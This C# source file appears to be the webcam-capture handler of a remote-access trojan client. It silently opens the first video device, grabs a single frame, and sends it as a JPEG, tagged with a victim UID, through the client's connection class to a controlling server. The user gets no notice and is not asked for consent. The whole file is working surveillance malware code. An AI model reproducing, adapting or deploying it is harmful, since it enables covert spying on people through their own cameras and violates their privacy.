using AForgeVideo = AForge.Video;
using AForgeDirectShow = AForge.Video.DirectShow;
using Client.Connection;
using Client.Things;
using System.Drawing;
using System.IO;

namespace Client.Handlers
{
    internal class Handlewebcam
    {
        private AForgeDirectShow.FilterInfoCollection videoDevices;
        private AForgeDirectShow.VideoCaptureDevice videoSource;
        private Bitmap currentFrame;

        public Handlewebcam()
        {
            CapturePhoto();
        }

        private void InitializeWebcam()
        {
            videoDevices = new AForgeDirectShow.FilterInfoCollection(AForgeDirectShow.FilterCategory.VideoInputDevice);
            if (videoDevices.Count == 0)
            {
                return;
            }
            videoSource = new AForgeDirectShow.VideoCaptureDevice(videoDevices[0].MonikerString);
            videoSource.NewFrame += new AForgeVideo.NewFrameEventHandler(VideoSource_NewFrame);
            videoSource.Start();
        }

        private void VideoSource_NewFrame(object sender, AForgeVideo.NewFrameEventArgs eventArgs)
        {
            currentFrame = (Bitmap)eventArgs.Frame.Clone();
            videoSource.SignalToStop();
            videoSource.WaitForStop();
        }

        public void CapturePhoto()
        {
            InitializeWebcam();
            while (currentFrame == null) { } // Espera a que se capture una foto
            SendFrame();
        }

        private void SendFrame()
        {
            if (currentFrame != null)
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    currentFrame.Save(ms, System.Drawing.Imaging.ImageFormat.Jpeg);
                    byte[] imageBytes = ms.ToArray();

                    Stuff.Pack meow = new Stuff.Pack();
                    meow.Set("Packet", "Webcam");
                    meow.Set("UID", UID.Get());
                    meow.Set("Image", imageBytes);
                    SillyClient.Send(meow.Pacc());
                }
            }
        }
    }
}
